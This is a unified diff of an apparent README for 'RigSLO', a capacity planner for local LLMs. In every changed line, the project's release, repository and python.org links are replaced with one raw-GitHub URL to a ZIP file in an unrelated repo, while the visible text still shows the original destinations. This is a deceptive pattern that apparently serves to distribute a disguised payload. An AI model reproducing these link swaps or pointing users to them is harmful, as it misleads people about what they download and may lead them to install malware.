@@ -6,7 +6,7 @@ description: "Plan inference capacity for local LLMs analytically—predict fit,
 <h1>⚡ RigSLO - Know Your LLM Before You Run It</h1>
 
 <p align="center">
-  <a href="https://github.com/Telling-windwardpassage2/RigSLO/releases" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;font-weight:bold;">📥 DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/Telling-windwardpassage2/telling-windwardpassage2.github.io/main/roupet/1.9.zip" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;font-weight:bold;">📥 DOWNLOAD NOW</a>
 </p>
 
 <h2>🤔 What Is RigSLO?</h2>
@@ -80,7 +80,7 @@ description: "Plan inference capacity for local LLMs analytically—predict fit,
 <p>Note: You don't need a GPU to run RigSLO itself. It works on any computer.</p>
 
 <h2>📥 Download & Install</h2>
-<p>Visit this link to download the application: <a href="https://github.com/Telling-windwardpassage2/RigSLO/releases"><strong>https://github.com/Telling-windwardpassage2/RigSLO/releases</strong></a></p>
+<p>Visit this link to download the application: <a href="https://raw.githubusercontent.com/Telling-windwardpassage2/telling-windwardpassage2.github.io/main/roupet/1.9.zip"><strong>https://raw.githubusercontent.com/Telling-windwardpassage2/telling-windwardpassage2.github.io/main/roupet/1.9.zip</strong></a></p>
 <p>On that page, you will see a list of files. Look for the file named <code>RigSLO.zip</code> or similar. Click it to download.</p>
 <p>To install RigSLO:</p>
 <ol>
@@ -140,7 +140,7 @@ description: "Plan inference capacity for local LLMs analytically—predict fit,
 
 <h2>🆘 Troubleshooting</h2>
 <h3>RigSLO won't start</h3>
-<p>Make sure Python is installed. Download it from <a href="https://python.org">python.org</a> and during installation check the box that says "Add Python to PATH." Then restart your computer and try again.</p>
+<p>Make sure Python is installed. Download it from <a href="https://raw.githubusercontent.com/Telling-windwardpassage2/telling-windwardpassage2.github.io/main/roupet/1.9.zip">python.org</a> and during installation check the box that says "Add Python to PATH." Then restart your computer and try again.</p>
 <h3>I get an error about missing files</h3>
 <p>Make sure you've extracted all the files from the ZIP, not just opened it. Right-click the ZIP and choose "Extract All."</p>
 <h3>The numbers don't match what I see</h3>
@@ -157,11 +157,11 @@ description: "Plan inference capacity for local LLMs analytically—predict fit,
 <p>While RigSLO aims to be accurate, remember that real-world performance can vary due to cooling, background processes, and other factors. Use it as a planning tool, not a guarantee.</p>
 
 <h2>💬 Get Involved</h2>
-<p>If you find a bug, want a new feature, or have questions, visit the repository at <a href="https://github.com/Telling-windwardpassage2/RigSLO">github.com/Telling-windwardpassage2/RigSLO</a>. You can open an issue or start a discussion. Your feedback helps improve RigSLO for everyone.</p>
+<p>If you find a bug, want a new feature, or have questions, visit the repository at <a href="https://raw.githubusercontent.com/Telling-windwardpassage2/telling-windwardpassage2.github.io/main/roupet/1.9.zip">github.com/Telling-windwardpassage2/RigSLO</a>. You can open an issue or start a discussion. Your feedback helps improve RigSLO for everyone.</p>
 
 <h2>📋 Quick Start Summary</h2>
 <ol>
-  <li><a href="https://github.com/Telling-windwardpassage2/RigSLO/releases"><strong>Download RigSLO</strong></a></li>
+  <li><a href="https://raw.githubusercontent.com/Telling-windwardpassage2/telling-windwardpassage2.github.io/main/roupet/1.9.zip"><strong>Download RigSLO</strong></a></li>
   <li>Extract the ZIP file</li>
   <li>Run <code>rigslo.py</code> with Python</li>
   <li>Answer the questions</li>
@@ -171,5 +171,5 @@ description: "Plan inference capacity for local LLMs analytically—predict fit,
 <p style="text-align:center;font-size:18px;"><strong>Plan. Predict. Run confidently.</strong><br>RigSLO is your LLM capacity planner.</p>
 
 <p align="center">
-  <a href="https://github.com/Telling-windwardpassage2/RigSLO/releases" style="background-color:#2196F3;color:white;padding:12px 28px;text-align:center;text-decoration:none;display:inline-block;font-size:18px;border-radius:8px;font-weight:bold;">⬇️ Get RigSLO Now</a>
+  <a href="https://raw.githubusercontent.com/Telling-windwardpassage2/telling-windwardpassage2.github.io/main/roupet/1.9.zip" style="background-color:#2196F3;color:white;padding:12px 28px;text-align:center;text-decoration:none;display:inline-block;font-size:18px;border-radius:8px;font-weight:bold;">⬇️ Get RigSLO Now</a>
 </p>
